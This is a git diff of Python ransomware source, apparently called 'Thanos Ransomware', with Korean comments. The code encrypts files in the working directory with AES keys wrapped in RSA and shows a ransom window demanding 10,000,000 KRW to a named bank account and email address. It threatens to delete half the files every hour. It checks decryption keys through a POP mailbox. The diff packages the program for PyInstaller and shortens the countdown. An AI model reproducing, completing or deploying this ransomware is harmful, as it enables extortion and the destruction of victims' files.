@@ -5,6 +5,7 @@ from Crypto.PublicKey import RSA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 import os
+import sys
 import random
 import threading
 from time import sleep
@@ -44,8 +45,8 @@ def enc(key, cipher, in_filename, out_filename=None):
             pass
 
         with open(out_filename, 'ab') as outfile:  # 이어쓰기 모드
-            # RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
-            outfile.write(b'0' * (64832 - len(str(size_of_data))) + str(size_of_data).encode())
+            # RSA : 길이 11 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
+            outfile.write(b'0' * (11 - len(str(size_of_data))) + str(size_of_data).encode())
 
             # RSA : 암호화된 AES 키를 넣어줌 (128바이트)
             outfile.write(ciphertext)
@@ -64,11 +65,15 @@ def dec(cipher, in_filename, out_filename=None):
         e_data = infile.read()
 
         # RSA : 파일의 크기와 암호화된 AES 키 추출
-        size_of_data = int(e_data[:64832].lstrip(b'0').decode())
-        aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키
+        size_of_data = e_data[:11].lstrip(b'0').decode()
+        #크기가 0 바이트일 때
+        if(size_of_data == ''):
+            return
+        size_of_data = int(size_of_data)
+        aes_key_enc = e_data[11:139]  # 암호화된 aes 키 (128바이트)
 
         # RSA : 암호화된 진짜 원본 데이터 추출
-        e_data = e_data[64960:]
+        e_data = e_data[139:]
 
         # RSA : 추출한 AES 키 복호화
         aes_key_dec = cipher.decrypt(aes_key_enc)
@@ -82,7 +87,7 @@ def dec(cipher, in_filename, out_filename=None):
 
 def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.destroy()
-    gui.l_thanos = AnimatedGIF(gui.window, "../ui/thanos1.gif")
+    gui.l_thanos = AnimatedGIF(gui.window, resource_path("ui/thanos1.gif"))
     gui.l_thanos.pack()
 
     sleep(2)
@@ -106,6 +111,12 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
 
     startTimer(gui, os.getcwd())  # @@
 
+def resource_path(relative_path):
+    print(getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__))))
+    """ Get absolute path to resource, works for dev and for PyInstaller """
+    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+    print(os.path.join(base_path, relative_path))
+    return (os.path.join(base_path, relative_path))
 
 class AnimatedGIF(Label, object):
     def __init__(self, master, path, forever=True):
@@ -217,12 +228,13 @@ class MyTk:
                                          "\nYour photos, documents, etc..."
                                          "\nBut, don't worry! I have not deleted them yet :D"
                                          "\nYou have some time to pay 10,000,000KRW in our account to get the decryption key."
+                                         "\nSend the money to the account below, and send the details and your UUID to the below e-mail."
                                          "\nOUR ACCOUNT : KB 786102-00-040854"
-                                         "\nIf you send money, send an e-mail with your account at this address."
                                          "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
-                                         "\nEvery hour half of all files will be deleted."
+                                         "\nYOU UUID : "+str(UUID)+
+                                         "\nIf you dont, every hour half of all files will be deleted."
                                          "\n------WARNING------"
-                                         "\nDo not force-terminate this program."
+                                         "\nDo not terminate this program."
                                          "\nYou will NEVER decrypt your files."
                                          "\n",
                                     fg="green", bg="black", font='Helvetica 14 bold')
@@ -243,16 +255,11 @@ class MyTk:
         self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit, disabledforeground='green')
         self.pwbutton.pack()
 
-        self.thanos = tkinter.PhotoImage(file="../ui/face.png")
+        self.thanos = tkinter.PhotoImage(file=resource_path("ui/face.png"))
         self.l_thanos = tkinter.Label(self.window, image=self.thanos, borderwidth=0, compound="center",
                                       highlightthickness=0)
         self.l_thanos.pack()
 
-    '''
-    def disable_event(self):
-        messagebox.showinfo(title="Thanos Ransomware", message="You can't leave this window.")
-        pass
-'''
 
     def keySubmit(self):
         self.pw = str(self.password.get())
@@ -260,31 +267,16 @@ class MyTk:
         self.l_input.config(text=" The keys are being checked ... ")
         self.pwbutton.config(state='disabled')
 
-        self.parent and self.parent.checkPassword(self.pw)
-
-        self.pwbutton.config(state='normal')
-        #self.pwbutton['state'] = 'normal'
-        self.l_input.config(text=" It's the wrong key.")
+        if (self.parent and self.parent.checkPassword(self.pw)):
+            self.finalGui()
+        else:
+            self.pwbutton.config(state='normal')
+            self.l_input.config(text=" It's the wrong key.")
 
 
 
 
     def finalGui(self):
-        print("디버깅1")
-        '''
-        self.l_timer.destroy()
-        self.l_input.destroy()
-        self.password.destroy()
-        self.pwbutton.destroy()
-        self.l_thanos.destroy()
-
-        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", fg="red",
-                           font='Helvetica 24 bold')
-        print("디버깅2")
-        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
-        self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
-        self.l_final.pack()
-'''
         self.l_timer.destroy()
         self.l_input.destroy()
         self.password.destroy()
@@ -293,7 +285,7 @@ class MyTk:
 
         self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')
 
-        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
+        self.final_image = tkinter.PhotoImage(file=resource_path("ui/final_thanos.png"))
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
         self.l_final.pack()
         #sleep(5)
@@ -309,7 +301,7 @@ class MyTk:
         self.pwbutton.destroy()
         self.l_thanos.destroy()
 
-        self.l_text.config(text="\n\n\n\nYour files are all deleted.\n\n", fg="red",
+        self.l_text.config(text="\n\n\n\nAll your files are deleted.\n\n", fg="red",
                            font='Helvetica 50 bold')
 
         sleep(5)
@@ -338,8 +330,6 @@ def startTimer(gui, path, ext=None):
     antdd_filelist = []
 
     enc_search_dir(antdd_filelist, path)
-    for i in antdd_filelist:
-        print(i)
 
     if len(antdd_filelist) == 0:
         gui.allRemovePrint()
@@ -355,7 +345,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 500, antdd_filelist)
+    clock(gui, 10, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
@@ -392,26 +382,6 @@ class RealMain:
 
         self.myGui = MyTk(parent=self)  # 자기자신에 대한 레퍼런스를 가지는 gui 객체 생성
 
-    def encListFiles(self, path):
-        filelist = []
-        for name in os.listdir(path):
-            if os.path.isfile(os.path.join(path, name)):
-                for i in extlist:
-                    if name.endswith(i):
-                        filelist.append(name)
-                    else:
-                        continue
-
-        return filelist
-
-    def decListFiles(self, path):
-        filelist = []
-        for name in os.listdir(path):
-            if name.endswith(".antdd"):
-                filelist.append(name)
-            else:
-                continue
-        return filelist
 
     def run(self):
         # smtp 로그인 후 비밀키 전송
@@ -431,8 +401,6 @@ class RealMain:
         enc_targetlist = []
         search_dir(enc_targetlist, os.getcwd())
 
-        for i in enc_targetlist:
-            print('run=>',i)
 
         for enc_target in enc_targetlist:
             if enc_target.split('.')[-1] == 'antdd':
@@ -458,11 +426,6 @@ class RealMain:
         # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석
         for i in range(len(server.list()[1])):
             msg = server.retr(i + 1)[1]
-            # text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
-            #idx = text.find('Subject:')
-            #text = text[idx + 9:]
-            # uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
-            # key = text[42:]  # 메일에 들어있는 해당 주소의 private key
             uuid = msg[12].decode()[msg[12].decode().find(':') + 2:]
             key = b'\n'.join(msg[15:]).decode()
 
@@ -470,21 +433,18 @@ class RealMain:
             if uuid == str(UUID):
                 # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                 if key.strip() == gui_input.strip():
-                    print("들어옴2")
                     # 해당 메일 삭제
                     server.dele(i + 1)
                     server.quit()
 
                     ##! 복호화 및 타겟파일 삭제
-                    #dec_targetlist = self.decListFiles(os.getcwd())  # @@
                     dec_targetlist = []
                     enc_search_dir(dec_targetlist, os.getcwd())
                     for dec_target in dec_targetlist:
                         dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                         os.remove(dec_target)
 
-                    self.myGui.finalGui()
-                    #self.myGui.window.destroy()
+                    return True
 
 
 
@@ -492,8 +452,9 @@ if __name__ == "__main__":
     for i in range(5):
         with open("test" + str(i) + '.txt', 'wb') as testfile:
             testfile.write('테스트입니다'.encode())
+    os.makedirs(os.path.join(os.getcwd(),'test'))
     for i in range(5):
-        with open("ui/test" + str(i) + '.txt', 'wb') as testfile:
+        with open("test/test" + str(i) + '.txt', 'wb') as testfile:
             testfile.write('테스트입니다'.encode())
     r = RealMain()
     r.run()
